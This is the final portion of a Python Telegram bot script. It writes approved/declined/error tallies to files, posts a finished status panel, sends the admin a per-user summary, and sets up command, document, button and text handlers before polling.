        f.write(f"Declined count: {session.declined}\n")
    with open(session.file("errors.txt"), "w", encoding="utf-8") as f:
        f.write(f"Errors count: {session.errors}\n")

    # final panel
    try:
        await panel.edit_text(
            f"<b>🏁 FINISHED</b>\n\n{live_status_text(session)}",
            parse_mode=ParseMode.HTML,
            reply_markup=kb_main(session)
        )
    except Exception:
        await bot.send_message(
            chat_id,
            f"<b>🏁 FINISHED</b>\n\n{live_status_text(session)}",
            parse_mode=ParseMode.HTML,
            reply_markup=kb_main(session)
        )

    # notify admin (summary only)
    if ADMIN_CHAT_ID and str(chat_id) != str(ADMIN_CHAT_ID):
        try:
            await bot.send_message(
                ADMIN_CHAT_ID,
                f"<b>🏁 User finished</b>\n"
                f"👤 <code>{chat_id}</code>\n"
                f"✅ Approved: <b>{session.approved}</b>\n"
                f"❌ Declined: <b>{session.declined}</b>",
                parse_mode=ParseMode.HTML)
        except Exception:
            pass


async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    log("EXCEPTION:", traceback.format_exc())


async def post_init(app: Application):
    await app.bot.set_my_commands([
        BotCommand("start", "Open menu"),
        BotCommand("menu", "Show menu"),
    ])
    log("Bot online. Admin:", ADMIN_CHAT_ID or "(none)")


def main():
    if not TELEGRAM_BOT_TOKEN:
        log("FATAL: TELEGRAM_BOT_TOKEN not set")
        sys.exit(1)

    app = (
        Application.builder()
        .token(TELEGRAM_BOT_TOKEN)
        .post_init(post_init)
        .build()
    )

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("menu", cmd_menu))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(CallbackQueryHandler(on_button))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_cfg))
    app.add_error_handler(error_handler)

    log("Polling...")
    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)


if __name__ == "__main__":
    main()
